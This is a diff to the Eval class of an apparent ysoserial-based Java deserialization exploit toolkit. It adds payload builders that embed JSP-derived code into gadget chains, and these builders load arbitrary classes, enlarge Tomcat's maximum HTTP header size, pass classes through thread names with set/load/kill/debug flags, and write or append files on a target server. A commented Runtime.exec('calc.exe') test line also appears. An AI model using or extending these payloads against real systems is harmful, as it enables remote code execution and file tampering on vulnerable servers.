@@ -9,6 +9,7 @@ import ysoserial.payloads.util.Encoder;
 import ysoserial.payloads.util.JavaCompiler;
 import ysoserial.payloads.util.ReadWrite;
 
+import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -18,8 +19,8 @@ public class Eval {
 //        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
 //        Object o = new Eval().getObject(RomeTools.class,code);
 //        Object o = new Eval().basicInfo2File(RomeTools.class,"/tmp/1.txt");
-        Object o = new Eval().updateJar(RomeTools.class,"/tmp/test.jar","1.txt",ReadWrite.readFile("/tmp/1.txt"));
-
+//        Object o = new Eval().updateJar(RomeTools.class,"/tmp/test.jar","1.txt",ReadWrite.readFile("/tmp/1.txt"));
+        Object o = new Eval().uploadFile(RomeTools.class,"test".getBytes(StandardCharsets.UTF_8),"/tmp/test.txt",true);
         byte[] ser = Serializer.serialize(o);
 
         Deserializer.deserialize(ser);
@@ -49,6 +50,13 @@ public class Eval {
         return o;
     }
 
+    public Object loadClass(Class gadget,String classPath,String className) throws Exception{
+        String jsp = new String(ReadWrite.readResource(Eval.class,"eval/load_class.jsp"));
+        String java = getJavaCodeFromJSP(jsp);
+        java = java.replace("%classPath%",classPath).replace("%className%",className);
+        return getObject(gadget,java);
+    }
+
     public Object updateJar(Class gadget , String jarPath , String entryPath , byte[] content , String className) throws Exception{
         String java = new String(ReadWrite.readResource(Eval.class,"eval/UpdateJar.java"));
         String b64 = Encoder.base64_encode(content);
@@ -64,13 +72,36 @@ public class Eval {
         return o;
     }
 
+    public Object setTomcatMaxHttpHeaderSize(Class gadget,int size) throws Exception{
+        String jsp = new String(ReadWrite.readResource(Eval.class, "eval/tomcat_header_setMaxHttpHeaderSize.jsp"));
+        String java = getJavaCodeFromJSP(jsp);
+        java = java.replace("%headerSize%",String.valueOf(size));
+        return getObject(gadget,java);
+    }
+
+    public Object loadClassFromThreadName(Class gadget , String flag , String b64OrClassName) throws Exception{
+        if (flag.equals("set") || flag.equals("load") || flag.equals("kill") || flag.equals("debug")){
+            String jsp = new String(ReadWrite.readResource(Eval.class,"eval/tomcat_header_setThreadName.jsp"));
+            String java = getJavaCodeFromJSP(jsp);
+            java = java.replace("%flag%",flag);
+            if (b64OrClassName != null){
+                java = java.replace("%b64%",b64OrClassName).replace("%className%",b64OrClassName);
+            }
+            return getObject(gadget,java);
+        }
+        throw new Exception("[!] flag must be one of set , load , kill , debug");
+    }
+
     public Object uploadFile(Class gadget,String souce, String destination) throws Exception{
         byte[] content = ReadWrite.readFile(souce);
         return uploadFile(gadget,content,destination);
     }
     public Object uploadFile(Class gadget,byte[] content, String destination) throws Exception{
+        return uploadFile(gadget,content,destination,false);
+    }
+    public Object uploadFile(Class gadget,byte[] content, String destination, boolean append) throws Exception{
         String b64 = Encoder.base64_encode(content);
-        String code = new String(ReadWrite.readResource(Eval.class, "eval/update_file.jsp"));
+        String code = new String(ReadWrite.readResource(Eval.class, "eval/upload_file.jsp"));
 
         int i = 0;
         long l = b64.length();
@@ -88,7 +119,7 @@ public class Eval {
         sb.append("String b64 = String.join(\"\",b);\n");
         b64 = sb.toString();
 
-        code = code.replace("String b64 = \"%b64%\";",b64).replace("%destination%",destination);
+        code = code.replace("String b64 = \"%b64%\";",b64).replace("%destination%",destination).replace("%append%",String.valueOf(append));
         code = getJavaCodeFromJSP(code);
         return getObject(gadget,code);
     }
